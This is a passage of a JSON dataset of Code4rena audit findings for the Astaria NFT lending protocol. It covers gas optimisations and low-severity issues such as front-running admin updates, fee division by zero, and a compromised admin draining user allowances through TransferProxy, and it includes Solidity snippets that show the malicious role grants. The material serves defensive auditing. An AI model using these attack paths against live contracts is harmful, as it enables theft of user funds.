amount) internal returns (uint256) {\n398:    address feeTo = ROUTER().feeTo();\n399:    bool feeOn = feeTo != address(0);\n400:    if (feeOn) {\n401:      uint256 fee = ROUTER().getProtocolFee(amount);\n```\n\n```diff\ndiff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol\nindex b5ff5d7..41ea5ee 100644\n--- a/src/VaultImplementation.sol\n+++ b/src/VaultImplementation.sol\n@@ -395,10 +395,11 @@ abstract contract VaultImplementation is\n   }\n\n   function _handleProtocolFee(uint256 amount) internal returns (uint256) {\n-    address feeTo = ROUTER().feeTo();\n+    IAstariaRouter _ROUTER = ROUTER();\n+    address feeTo = _ROUTER.feeTo();\n     bool feeOn = feeTo != address(0);\n     if (feeOn) {\n-      uint256 fee = ROUTER().getProtocolFee(amount);\n+      uint256 fee = _ROUTER.getProtocolFee(amount);\n\n       unchecked {\n         amount -= fee;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25863",
      "title": "[G-01] Pack structs by putting variables that can fit together next to each other",
      "impact": "GAS",
      "content": "\nAs the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas.\n\n### StrategyDetailsParam: version and vault can be packed together: `Gas saved: 1 * 2k = 2k`\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/interfaces/IAstariaRouter.sol#L101-L105\n\n```solidity\nFile: /src/interfaces/IAstariaRouter.sol\n101:  struct StrategyDetailsParam {\n102:    uint8 version;\n103:    uint256 deadline;\n104:    address vault;\n105:  }\n```\n\n```diff\ndiff --git a/src/interfaces/IAstariaRouter.sol b/src/interfaces/IAstariaRouter.sol\nindex 2ae1431..679f46a 100644\n--- a/src/interfaces/IAstariaRouter.sol\n+++ b/src/interfaces/IAstariaRouter.sol\n@@ -100,8 +100,8 @@ interface IAstariaRouter is IPausable, IBeacon {\n\n   struct StrategyDetailsParam {\n     uint8 version;\n-    uint256 deadline;\n     address vault;\n+    uint256 deadline;\n   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25862",
      "title": "[12] Compromised owner is capable of draining all user's fund after user gives token allowance to TransferProxy.sol",
      "impact": "LOW",
      "content": "\nThe TransferProxy.sol is important because it helps with moving the fund around in AuctionHouse, AstariaRouter and in LienToken.\n\nAs we can see, this function below is powerful. It is likely that user will give the max token allowance to the contract TransferProxy, otherwise, transaction would revert in AuctionHouse.sol, LienToken and in AuctionHouse.\n\n```solidity\n  function tokenTransferFrom(\n    address token,\n    address from,\n    address to,\n    uint256 amount\n  ) external requiresAuth {\n    ERC20(token).safeTransferFrom(from, to, amount);\n  }\n```\n\nWell, note that the requiresAuth modifier is used in the function tokenTransferFrom, this access control model means that only specific address set up by admin can call this function.\n\nIf the admin is compromised, the admin can authorize malicious contract that can drain all the token fund from user by calling the above tokenTransferFrom after user gives token allowance to TransferProxy.sol\n\nBecause the requiresAuth modifier calls:\n\n```solidity\nmodifier requiresAuth() virtual {\nrequire(isAuthorized(msg.sender, msg.sig), \"UNAUTHORIZED\");\n\n_;\n}\n```\n\nwhich calls:\n\n```solidity\n  function isAuthorized(address user, bytes4 functionSig)\n    internal\n    view\n    virtual\n    returns (bool)\n  {\n    AuthStorage storage s = _getAuthSlot();\n    Authority auth = s.authority; // Memoizing authority saves us a warm SLOAD, around 100 gas.\n\n    // Checking if the caller is the owner only after calling the authority saves gas in most cases, but be\n    // aware that this makes protected functions uncallable even to the owner if the authority is out of order.\n    return\n      (address(auth) != address(0) &&\n        auth.canCall(user, address(this), functionSig)) || user == s.owner;\n  }\n```\n\nThe auth.canCall is called in MultiRolesAuthority.sol, as shown in the Deploy.sol script\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L118\n\n```solidity\naddress auth = testModeDisabled ? msg.sender : address(this);\nMRA = new MultiRolesAuthority(auth, Authority(address(0)));\n```\n\nAnd the relevent authorization is granted by calling:\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L377\n\n```solidity\nMRA.setRoleCapability(\n  uint8(UserRoles.ASTARIA_ROUTER),\n  TRANSFER_PROXY.tokenTransferFrom.selector,\n  true\n);\n```\n\nand\n\nhttps://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L410\n\n```solidity\nMRA.setUserRole(\n  address(ASTARIA_ROUTER),\n  uint8(UserRoles.ASTARIA_ROUTER),\n  true\n);\n```\n\nby calling:\n\n```solidity\nfunction setRoleCapability(\n\tuint8 role,\n\tbytes4 functionSig,\n\tbool enabled\n) public virtual requiresAuth {\n\tif (enabled) {\n\t\tgetRolesWithCapability[functionSig] |= bytes32(1 << role);\n\t} else {\n\t\tgetRolesWithCapability[functionSig] &= ~bytes32(1 << role);\n\t}\n\n\temit RoleCapabilityUpdated(role, functionSig, enabled);\n}\n```\n\nA compromised admin can call:\n\n```solidity\nMRA.setRoleCapability(\n  uint8(UserRoles.MALICIOUS),\n  TRANSFER_PROXY.tokenTransferFrom.selector,\n  true\n);\n```\n\nand\n\n```solidity\nMRA.setUserRole(\n  address(malicious_contract_or_account),\n  uint8(UserRoles.MALICIOUS),\n  true\n);\n```\n\nThen the malicious\\_contract\\_or\\_account address has permission to call tokenTransferFrom, which drains user token after user gives token allowance to TransferProxy.sol. All he needs to do is set the token to token that he wants to transfer and steal, the address from is victim's address, the address to is the recipient (hacker's address), the amount is how much he wants to transfer and drain.\n\n```solidity\nfunction tokenTransferFrom(\naddress token,\naddress from,\naddress to,\nuint256 amount\n) external requiresAuth {\n\tERC20(token).safeTransferFrom(from, to, amount);\n}\n```\n\nThe reference (relevant )code for MultiRolesAuthority in solmate:\n\nhttps://github.com/transmissions11/solmate/blob/main/src/test/MultiRolesAuthority.t.sol\n\n### Recommended Mitigation Steps\n\nOnly use safeIncreaseAllowance to give minimum approval to move the fund around, use multisig to safeguard to admin.\n\n**[SantiagoGregory (Astaria) disputed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/76#issuecomment-1412961381):**\n > **[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting**<br>\n> @androolloyd - Don't think this is worth the storage costs and can't be used maliciously (as far as I can tell).\n\n**[androolloyd (Astaria) disputed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/70#issuecomment-1413611159):**\n > **[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird**<br>\n> In the case of moonbirds, but also applying to all nfts that would be flash enabled, there is a security hooks mechanism that lets us query the state of the underlying asset, we would have to write and deploy a security hook for the moon bird contract that would check the nesting status, we would then prohibit the transaction because the state of the nft is changed.\n>\n> The security hook can fetch any data about an nft from calls and then compare them after the nft has been returned.\n\n**[SantiagoGregory (Astaria) disputed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/50#issuecomment-1412898631):**\n > **[04] If an auction has no bidder, the NFT ownership should go back to the loan lenders instead of liquidator**<br>\n> LPs implicitly take the risk of auctions resulting in very low or no bids. Auctions are a way to distribute liquidation results equitably to LPs, and if there are no bids, then there is no way to distribute that value.\n\n**[SantiagoGregory (Astaria) disagreed with severity and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/101#issuecomment-1412958485):**\n > **[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but `s.protocolFeeDenominator` is not set**<br>\n> Low severity because this would be configured before the fee switch was turned on.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/83#issuecomment-1413615500):**\n > **[09] Should use _safeMint instead of mint in CollateralToken#onERC721Received**<br>\n> Acknowledged.\n\n**[SantiagoGregory (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/78#issuecomment-1412959654):**\n > **[10] Adversary can front-run admin's state update and parameter update**<br>\n> Acknowledged. Not really an issue IMO.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/52#issuecomment-1413618912):**\n > **[12] Compromised owner is capable of draining all user's fund after user gives token allowance to TransferProxy.sol**<br>\n> Acknowledged.\n\n**Picodes (judge) commented:**\n > **[[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting](https://github.com/code-423n4/2023-01-astaria-findings/issues/76#issuecomment-1436097227)**<br>\n> Downgrading to low as it's an interesting suggestion but isn't of medium severity\n> \n > **[[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird](https://github.com/code-423n4/2023-01-astaria-findings/issues/70#issuecomment-1441360783)**<br>\n> This is a remarkable and very creative finding. But considering this is specific to MoonBird's behavior and that Astaria has a `securityHook` for this kind of case, downgrading to low.\n> \n> **[[05] Security hook should not be set for a NFT that is not Uniswap V3 Position NFT](https://github.com/code-423n4/2023-01-astaria-findings/issues/109#issuecomment-1405562237)**<br>\n> Low severity as this is a configuration error, easily fixable by the admins.\n>\n > **[[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but `s.protocolFeeDenominator` is not set](https://github.com/code-423n4/2023-01-astaria-findings/issues/101#issuecomment-1441350707)**<br>\n> Downgrading to low as this is a configuration mistake by the admin.\n>\n > **[[09] Should use _safeMint instead of mint in CollateralToken#onERC721Received](https://github.com/code-423n4/2023-01-astaria-findings/issues/83#issuecomment-1436096534)**<br>\n> Downgrading to low as it's more a safety check than anything else here.\n>\n > **[[10] Adversary can front-run admin's state update and parameter update](https://github.com/code-423n4/2023-01-astaria-findings/issues/78#issuecomment-1436096842)**<br>\n> QA at best given that there is no real exploit scenario and it can be mitigated with private rpcs.\n>\n > **[[12] Compromised owner is capable of draining all user's fund after user gives token allowance to TransferProxy.sol](https://github.com/code-423n4/2023-01-astaria-findings/issues/52#issuecomment-1447965536)**<br>\n> After [this discussion](https://github.com/code-423n4/2023-01-astaria-findings/issues/617), I will downgrade this issue to Low severity, as I finally don't think we can consider this a case of \"privilege escalation\" versus changing the transfer proxy address for example. It boils down to Admin Privilege which is OOS per the automated report.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/52",
      "tags": [],
      "finders": []
    },
    {
      "id": "25861",
      "title": "[11] Solmate safeTransfer and safeTransferFrom does not check the codesize of the token address, which may lead to fund loss",
      "impact": "LOW",
      "content": "\nSolmate safetransferFrom doesn’t check the existence of code at the token address, all contract below that use SafeTransferLib and all safeTransfer and safeTransferFrom has the issue below. *(See warden's [original submission](https://github.com/code-423n4/2023-01-astaria-findings/issues/113) for the impacted function and LOC)*\n\n```solidity\n16 results - 16 files\n\nlib\\gpl\\lib\\solmate\\src\\mixins\\ERC4626.sol:\n  10  abstract contract ERC4626 is ERC20 {\n  11:     using SafeTransferLib for ERC20;\n  12      using FixedPointMathLib for uint256;\n\nlib\\gpl\\src\\ERC4626-Cloned.sol:\n  11  abstract contract ERC4626Cloned is IERC4626, ERC20Cloned {\n  12:   using SafeTransferLib for ERC20;\n  13    using FixedPointMathLib for uint256;\n\nlib\\gpl\\src\\ERC4626Router.sol:\n  12  abstract contract ERC4626Router is IERC4626Router, ERC4626RouterBase {\n  13:   using SafeTransferLib for ERC20;\n  14  \n\nlib\\gpl\\src\\ERC4626RouterBase.sol:\n  11  abstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall {\n  12:   using SafeTransferLib for ERC20;\n  13  \n\nlib\\seaport\\lib\\solmate\\src\\mixins\\ERC4626.sol:\n  10  abstract contract ERC4626 is ERC20 {\n  11:     using SafeTransferLib for ERC20;\n  12      using FixedPointMathLib for uint256;\n\nlib\\solmate\\src\\mixins\\ERC4626.sol:\n  10  abstract contract ERC4626 is ERC20 {\n  11:     using SafeTransferLib for ERC20;\n  12      using FixedPointMathLib for uint256;\n\nsrc\\AstariaRouter.sol:\n  56  {\n  57:   using SafeTransferLib for ERC20;\n  58    using SafeCastLib for uint256;\n\nsrc\\ClearingHouse.sol:\n  33    using Bytes32AddressLib for bytes32;\n  34:   using SafeTransferLib for ERC20;\n  35  \n\nsrc\\CollateralToken.sol:\n  69  {\n  70:   using SafeTransferLib for ERC20;\n  71    using CollateralLookup for address;\n\nsrc\\LienToken.sol:\n  47    using SafeCastLib for uint256;\n  48:   using SafeTransferLib for ERC20;\n  49  \n\nsrc\\PublicVault.sol:\n  49    using FixedPointMathLib for uint256;\n  50:   using SafeTransferLib for ERC20;\n  51    using SafeCastLib for uint256;\n\nsrc\\TransferProxy.sol:\n  21  contract TransferProxy is Auth, ITransferProxy {\n  22:   using SafeTransferLib for ERC20;\n  23  \n\nsrc\\Vault.sol:\n  25  contract Vault is VaultImplementation {\n  26:   using SafeTransferLib for ERC20;\n  27  \n\nsrc\\VaultImplementation.sol:\n  38  {\n  39:   using SafeTransferLib for ERC20;\n  40    using SafeCastLib for uint256;\n\nsrc\\WithdrawProxy.sol:\n  37  contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {\n  38:   using SafeTransferLib for ERC20;\n  39    using FixedPointMathLib for uint256;\n```\n\nThis is a known issue while using solmate’s libraries. Hence this may lead to miscalculation of funds and may lead to loss of funds, because if safetransfer() and safetransferfrom() are called on a token address that doesn’t have contract in it, it will always return success, bypassing the return value check.\n\nIf an underlying token is self-destructed, the code may consider the transfer because the lack of contract existence contract.\n\nDue to this, protocol will think that funds has been transferred and successful, and records will be accordingly calculated, but in reality funds were never transferred.\n\nSo this will lead to miscalculation and possibly loss of funds.\n\n### Recommended Mitigation Steps\n\nUse openzeppelin’s safeERC20 or implement a code existence check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/113",
      "tags": [],
      "finders": []
    },
    {
      "id": "25860",
      "title": "[10] Adversary can front-run admin's state update and parameter update",
      "impact": "LOW",
      "content": "\nAdmin has the authorization to update the parameter setting such as fee, epoch length, liquidation auction window, enable / disable the flashAuction, pause the protocol by calling the file function in AstariaRouter.sol, CollateralToken.sol and LienToken.sol\n\n```solidity\nsrc\\AstariaRouter.sol:\n  272  \n  273:   function file(File calldata incoming) public requiresAuth {\n  274      _file(incoming);\n\nsrc\\CollateralToken.sol:\n  205  \n  206:   function file(File calldata incoming) public requiresAuth {\n  207      _file(incoming);\n\nsrc\\LienToken.sol:\n  81  \n  82:   function file(File calldata incoming) external requiresAuth {\n  83      FileType what = incoming.what;\n```\n\nHowever, adversary can front-run admin's state up.\n\nLet me be specific, the adversay can front-run the admin's disable flashAuction transaction.\n\n```solidity\nfunction _file(File calldata incoming) internal {\nCollateralStorage storage s = _loadCollateralSlot();\n\nFileType what = incoming.what;\nbytes memory data = incoming.data;\nif (what == FileType.AstariaRouter) {\n  address addr = abi.decode(data, (address));\n  s.ASTARIA_ROUTER = IAstariaRouter(addr);\n} else if (what == FileType.SecurityHook) {\n  (address target, address hook) = abi.decode(data, (address, address));\n  s.securityHooks[target] = hook;\n} else if (what == FileType.FlashEnabled) {\n  (address target, bool enabled) = abi.decode(data, (address, bool));\n  s.flashEnabled[target] = enabled;\n}\n```\n\nnote the update:\n\n```solidity\nif (what == FileType.FlashEnabled) {\n  (address target, bool enabled) = abi.decode(data, (address, bool));\n  s.flashEnabled[target] = enabled;\n}\n```\n\nIf the admin submit a transaction to disable the target's flashAction,\n\nThe adversary can watch for the transaction in mempool, and once detecting the admin's transaction and decode the parameter to see admin's wants to disable his flashAction right,\n\nThe adversary can submit the transaction with higher gas fee to perform flash action before the admin's transaction is executed.\n\nSame type of front-running can be performed when adversary detects that the admin wants to pause the protocol. The adversary can front-run the pause transaction to deposit fund to mint more share from the vault, or commitTolLien to start a new loan term with NFT before the pause transactoin is executed.\n\n```solidity\n/**\n* @dev Enables _pause, freezing functions with the whenNotPaused modifier.\n*/\nfunction __emergencyPause() external requiresAuth whenNotPaused {\n_pause();\n}\n```\n\nThe adversary can in fact front-run the parameter setting update as well\n\n```solidity\n function _file(File calldata incoming) internal {\n    RouterStorage storage s = _loadRouterSlot();\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    if (what == FileType.AuctionWindow) {\n      (uint256 window, uint256 windowBuffer) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      s.auctionWindow = window.safeCastTo32();\n      s.auctionWindowBuffer = windowBuffer.safeCastTo32();\n    } else if (what == FileType.LiquidationFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.liquidationFeeNumerator = numerator.safeCastTo32();\n      s.liquidationFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.ProtocolFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.protocolFeeNumerator = numerator.safeCastTo32();\n      s.protocolFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.BuyoutFee) {\n      (uint256 numerator, uint256 denominator) = abi.decode(\n        data,\n        (uint256, uint256)\n      );\n      if (denominator < numerator) revert InvalidFileData();\n      s.buyoutFeeNumerator = numerator.safeCastTo32();\n      s.buyoutFeeDenominator = denominator.safeCastTo32();\n    } else if (what == FileType.MinInterestBPS) {\n      uint256 value = abi.decode(data, (uint256));\n      s.minInterestBPS = value.safeCastTo32();\n    } else if (what == FileType.MinDurationIncrease) {\n      uint256 value = abi.decode(data, (uint256));\n      s.minDurationIncrease = value.safeCastTo32();\n    } else if (what == FileType.MinEpochLength) {\n      s.minEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n    } else if (what == FileType.MaxEpochLength) {\n      s.maxEpochLength = abi.decode(data, (uint256)).safeCastTo32();\n    } else if (what == FileType.MaxInterestRate) {\n      s.maxInterestRate = abi.decode(data, (uint256)).safeCastTo88();\n    } else if (what == FileType.FeeTo) {\n      address addr = abi.decode(data, (address));\n      if (addr == address(0)) revert InvalidFileData();\n      s.feeTo = addr;\n    } else if (what == FileType.StrategyValidator) {\n      (uint8 TYPE, address addr) = abi.decode(data, (uint8, address));\n      if (addr == address(0)) revert InvalidFileData();\n      s.strategyValidators[TYPE] = addr;\n    } else {\n      revert UnsupportedFile();\n    }\n\n    emit FileUpdated(what, data);\n  }\n```\n\nFor example, the adversary detects that the admin wants to make the liquidation fee lower, the adversary can front-run admins' transaction by settling the liquidation and the liquidation fee payout before the admin's transaction is executed.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol use private RPC such as flashbot to submit transaction to avoid front-running.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/78",
      "tags": [],
      "finders": []
    },
    {
      "id": "25859",
      "title": "[09] Should use `_safeMint` instead of mint in CollateralToken#onERC721Received",
      "impact": "LOW",
      "content": "\nIn the current implementation of CollateralToken#onERC721Received, \\_mint is used instead of \\_safeMint, \\_safeMint checks that if the recipient is a contract, the receiver implements the onERC721Received hook to acknowledge that the contract is capable of receiving NFT to avoid loss of NFT ownership, however there is no such check in \\_mint, result in loss of NFT if the recipient is not designed to receive NFT.\n\n```solidity\n if (msg.sender == address(this) || msg.sender == address(s.LIEN_TOKEN)) {\n\trevert InvalidCollateral();\n  }\n\n  _mint(from_, collateralId);\n\n  s.idToUnderlying[collateralId] = Asset({\n\ttokenContract: msg.sender,\n\ttokenId: tokenId_\n  });\n\n  emit Deposit721(msg.sender, tokenId_, collateralId, from_);\n  return IERC721Receiver.onERC721Received.selector;\n```\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol use \\_safeMint instead of \\_mint when minting collateral token.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/83",
      "tags": [],
      "finders": []
    },
    {
      "id": "25858",
      "title": "[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but `s.protocolFeeDenominator` is not set",
      "impact": "LOW",
      "content": "\nIn the VaultImplementation, function commitToLien is called for lifecycle of new loan origination.\n\n```solidity\n  function commitToLien(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  )\n    external\n    whenNotPaused\n    returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)\n  {\n    _beforeCommitToLien(params);\n    uint256 slopeAddition;\n    (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n      params,\n      receiver\n    );\n    _afterCommitToLien(\n      stack[stack.length - 1].point.end,\n      lienId,\n      slopeAddition\n    );\n  }\n```\n\nwhich calls:\n\n```solidity\n(lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n  params,\n  receiver\n);\n```\n\nwhich calls:\n\n```solidity\n  function _requestLienAndIssuePayout(\n    IAstariaRouter.Commitment calldata c,\n    address receiver\n  )\n    internal\n    returns (\n      uint256 newLienId,\n      ILienToken.Stack[] memory stack,\n      uint256 slope,\n      uint256 payout\n    )\n  {\n    _validateCommitment(c, receiver);\n    (newLienId, stack, slope) = ROUTER().requestLienPosition(c, recipient());\n    payout = _handleProtocolFee(c.lienRequest.amount);\n    ERC20(asset()).safeTransfer(receiver, payout);\n  }\n```\n\nwhich calls:\n\n```solidity\n_handleProtocolFee(c.lienRequest.amount);\n```\n\n```solidity\nfunction _handleProtocolFee(uint256 amount) internal returns (uint256) {\naddress feeTo = ROUTER().feeTo();\nbool feeOn = feeTo != address(0);\nif (feeOn) {\n  uint256 fee = ROUTER().getProtocolFee(amount);\n\n  unchecked {\n\tamount -= fee;\n  }\n  ERC20(asset()).safeTransfer(feeTo, fee);\n}\nreturn amount;\n}\n```\n\nIf the feeTo address is set, the code will query the protocol fee and deduct from the amount.\n\nwhich calls `ROUTER().getProtocolFee(amount)`\n\n```solidity\n  function getProtocolFee(uint256 amountIn) external view returns (uint256) {\n    RouterStorage storage s = _loadRouterSlot();\n  \n    return\n      amountIn.mulDivDown(s.protocolFeeNumerator, s.protocolFeeDenominator);\n  }\n```\n\nnote that the `s.protocolFeeNumerator` and `s.protocolFeeDenominator` is not set in the init function of the AstariaRouter.sol, so if the feeTo address is set, transaction of commitToLien revert in division by zero error because `s.protocolFeeDenominator` is 0.\n\nIn fact, if we look into getLiquidatorFee and getBuyoutFee\n\n```solidity\n  function getLiquidatorFee(uint256 amountIn) external view returns (uint256) {\n    RouterStorage storage s = _loadRouterSlot();\n\n    return\n      amountIn.mulDivDown(\n        s.liquidationFeeNumerator,\n        s.liquidationFeeDenominator\n      );\n  }\n\n  function getBuyoutFee(uint256 remainingInterestIn)\n    external\n    view\n    returns (uint256)\n  {\n    RouterStorage storage s = _loadRouterSlot();\n    return\n      remainingInterestIn.mulDivDown(\n        s.buyoutFeeNumerator,\n        s.buyoutFeeDenominator\n      );\n  }\n```\n\nIf the `s.buyoutFeeDenominator` and `s.liquidationFeeDenominator` is 0, the divison by zero error can also occur, but these parameter is set in the init function of the AstariaRouter.sol\n\n```solidity\ns.liquidationFeeNumerator = uint32(130);\ns.liquidationFeeDenominator = uint32(1000);\ns.minInterestBPS = uint32((uint256(1e15) * 5) / (365 days));\ns.minEpochLength = uint32(7 days);\ns.maxEpochLength = uint32(45 days);\ns.maxInterestRate = ((uint256(1e16) * 200) / (365 days)).safeCastTo88();\n//63419583966; // 200% apy / second\ns.buyoutFeeNumerator = uint32(100);\ns.buyoutFeeDenominator = uint32(1000);\n```\n\nbut `s.protocolFeeNumerator` and `s.protocolFeeDenominator` is not set in the init function of the AstariaRouter.sol is not set in the init function of the AstariaRouter.sol\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol set the feeTo address and `s.protocolFeeNumerator` and `s.protocolFeeDenominator` together.\n\nAlso validate the buyout fee, liqudatior fee and protocol fee's dominator are not 0 to avoid division by zero error.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/101",
      "tags": [],
      "finders": []
    },
    {
      "id": "25857",
      "title": "[07] Certain function should not be marked as payable, otherwise the ETH that mistakenly sent along with the function call is locked in the contract",
      "impact": "LOW",
      "content": "\nIn AstariaRouter.sol deposit, mint, withdraw, redeem are payable\n\n```solidity\n  function mint(\n    IERC4626 vault,\n    address to,\n    uint256 shares,\n    uint256 maxAmountIn\n  )\n    public\n    payable\n    virtual\n    override\n    validVault(address(vault))\n    returns (uint256 amountIn)\n  {\n    return super.mint(vault, to, shares, maxAmountIn);\n  }\n\n  function deposit(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n    uint256 minSharesOut\n  )\n    public\n    payable\n    virtual\n    override\n    validVault(address(vault))\n    returns (uint256 sharesOut)\n  {\n    return super.deposit(vault, to, amount, minSharesOut);\n  }\n\n  function withdraw(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n    uint256 maxSharesOut\n  )\n    public\n    payable\n    virtual\n    override\n    validVault(address(vault))\n    returns (uint256 sharesOut)\n  {\n    return super.withdraw(vault, to, amount, maxSharesOut);\n  }\n\n  function redeem(\n    IERC4626 vault,\n    address to,\n    uint256 shares,\n    uint256 minAmountOut\n  )\n    public\n    payable\n    virtual\n    override\n    validVault(address(vault))\n    returns (uint256 amountOut)\n  {\n    return super.redeem(vault, to, shares, minAmountOut);\n  }\n```\n\nThe function pullToken is also marked as payable\n\n```solidity\n  function pullToken(\n    address token,\n    uint256 amount,\n    address recipient\n  ) public payable override {\n    RouterStorage storage s = _loadRouterSlot();\n    s.TRANSFER_PROXY.tokenTransferFrom(\n      address(token),\n      msg.sender,\n      recipient,\n      amount\n    );\n  }\n```\n\nThese function only performs ERC20 token and are not designed to receive ETH.\n\nThe ETH that mistakenly sent along with the function call is locked in the contract In AstariaRouter.sol.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol remove the payable keywords for the above mentioned function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/107",
      "tags": [],
      "finders": []
    },
    {
      "id": "25856",
      "title": "[06] Lack of support for ERC1155 NFT",
      "impact": "LOW",
      "content": "\nLack of support for ERC1155 NFT so a vast amount of popular ERC1155 NFT cannot be used as collateral to borrow fund.\n\n### Proof of Concept\n\nAccording to the documentation:\n\nhttps://docs.astaria.xyz/docs/faq#what-nfts-will-i-be-able-to-borrow-against\n\n> At launch, Astaria plans to support terms for leading NFT collections through its whitelisted strategist partners. Smaller collections may be supported at the discretion of individual whitelisted strategists, or by PrivateVaults.\n\nThe codebase use ERC721 safeTransferFrom extensively and assume that the underlyling NFT contract conforms to ERC721 standard.\n\nIn ClearingHouse.sol, the function below is used when flashAction is used \n\n```solidity\nClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n  addr,\n  tokenId,\n  address(receiver)\n);\n\n//trigger the flash action on the receiver\nif (\n  receiver.onFlashAction(\n\tIFlashAction.Underlying(s.clearingHouse[collateralId], addr, tokenId),\n\tdata\n  ) != keccak256(\"FlashAction.onFlashAction\")\n) {\n  revert FlashActionCallbackFailed();\n}\n```\n\nwhich calls the code below that use ERC721(tokenContract).safeTransferFrom\n\n```solidity\n  function transferUnderlying(\n    address tokenContract,\n    uint256 tokenId,\n    address target\n  ) external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n  }\n```\n\nand in CollateralToken.sol the function onERC721Received hook, the code needs to transfer the NFT from collateralToken to clearing house.\n\n```solidity\nERC721(msg.sender).safeTransferFrom(\n\taddress(this),\n\ts.clearingHouse[collateralId],\n\ttokenId_\n);\n```\n\nHowever, there are popular NFT, that conform to ERC1155 standard,\n\nhttps://etherscan.io/tokens-nft1155\n\nwhich use safeTransferFrom in ERC1155 implementation and does not match ERC721 safeTransferFrom method call\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/d59306bd06a241083841c2e4a39db08e1f3722cc/contracts/token/ERC1155/ERC1155.sol#L114\n\n```solidity\nfunction safeTransferFrom(\n\taddress from,\n\taddress to,\n\tuint256 id,\n\tuint256 amount,\n\tbytes memory data\n) public virtual override {\n```\n\n### 